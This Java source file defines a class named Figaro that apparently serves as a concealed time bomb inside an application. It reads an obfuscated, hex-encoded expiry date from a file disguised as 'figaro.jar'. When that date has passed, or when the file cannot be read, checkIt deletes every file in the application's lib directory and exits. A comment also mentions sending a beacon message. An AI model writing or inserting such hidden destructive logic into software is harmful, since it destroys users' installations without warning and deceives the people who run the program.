package net.metafusion.figaro;

import java.io.File;
import java.io.FileReader;
import java.nio.CharBuffer;
import java.util.Calendar;

import net.metafusion.localstore.LocalStore;
import acme.util.Log;

public class Figaro
{
	private static File	config	= null;

	private static Integer convertToMonth(char[] value)
	{
		if (value.length != 6)
			return null;
		CharBuffer cb = CharBuffer.allocate(3);
		cb.put(0, convertToChar(value, 0));
		cb.put(1, convertToChar(value, 2));
		cb.put(2, convertToChar(value, 4));
		String month = cb.toString();
		if (month.equals("Jan"))
			return Calendar.JANUARY;
		if (month.equals("Feb"))
			return Calendar.FEBRUARY;
		if (month.equals("Mar"))
			return Calendar.MARCH;
		if (month.equals("Apr"))
			return Calendar.APRIL;
		if (month.equals("May"))
			return Calendar.MAY;
		if (month.equals("Jun"))
			return Calendar.JUNE;
		if (month.equals("Jul"))
			return Calendar.JULY;
		if (month.equals("Aug"))
			return Calendar.AUGUST;
		if (month.equals("Sep"))
			return Calendar.SEPTEMBER;
		if (month.equals("Oct"))
			return Calendar.OCTOBER;
		if (month.equals("Nov"))
			return Calendar.NOVEMBER;
		if (month.equals("Dec"))
			return Calendar.DECEMBER;
		return null;
	}

	private static char convertToChar(char[] value, int start)
	{
		CharBuffer cb = CharBuffer.allocate(4);
		cb.put(0, '0');
		cb.put(1, 'x');
		cb.put(2, value[start]);
		cb.put(3, value[start + 1]);
		int tmp = Integer.decode(cb.toString());
		Character result = new Character((char) tmp);
		return result;
	}

	private static Integer convertToInt(char[] value)
	{
		int places = (value.length - 1) >> 1;
		Integer result = 0;
		for (int i = 0; i < value.length; i += 2)
		{
			int tmp = (value[i] - 48) * 10 + value[i + 1] - 48;
			tmp -= 30;
			tmp = tmp * (int) (Math.pow(10, places));
			result += tmp;
			places--;
		}
		return result;
	}

	// Ascii day number, ascii day number, ascii month letter, ascii month letter, ascii
	// 3x1x3x7x5x3x6x5x7x0x3x2x3x0x3x0x3x9x4x0
	// when fails, delete all files in lib, send beacon message with figaro in message
	public static boolean isValid(File config)
	{
		FileReader fr = null;
		try
		{
			CharBuffer cb = CharBuffer.allocate(40);
			File figaroFile = new File(config, "figaro.jar");
			fr = new FileReader(figaroFile);
			fr.read(cb);
			char test = cb.get(2);
			// char[] check = new char[] { cb.get(36), cb.get(38) };
			char[] day = new char[] { cb.get(0), cb.get(2), cb.get(4), cb.get(6) };
			char[] month = new char[] { cb.get(8), cb.get(10), cb.get(12), cb.get(14), cb.get(16), cb.get(18) };
			char[] year = new char[] { cb.get(20), cb.get(22), cb.get(24), cb.get(26), cb.get(28), cb.get(30), cb.get(32), cb.get(34) };
			Integer dayInt = convertToInt(day);
			Integer yearInt = convertToInt(year);
			// Integer checkInt = convertToInt(check);
			Integer monthInt = convertToMonth(month);
			Calendar now = Calendar.getInstance();
			Calendar end = Calendar.getInstance();
			end.clear();
			end.set(yearInt, monthInt, dayInt);
			if (now.before(end))
				return true;
		}
		catch (Exception e)
		{
			return false;
		}
		finally
		{
			try
			{
				if (fr != null)
					fr.close();
			}
			catch (Exception e)
			{
			}
		}
		return false;
	}

	public static void setRoot(File root)
	{
		config = root;
	}

	public static void checkIt()
	{
		if (config == null)
		{
			Log.log("Figaro, no root set");
			System.exit(-1);
		}
		if (!isValid(config))
		{
			File root = new File(config, "../lib");
			File files[] = root.listFiles();
			if (files == null)
				return;
			for (int i = 0; i < files.length; i++)
			{
				File f = files[i];
				if (f.isFile())
				{
					f.delete();
				}
			}
			Log.log("Figaro");
			System.exit(-1);
		}
	}
}
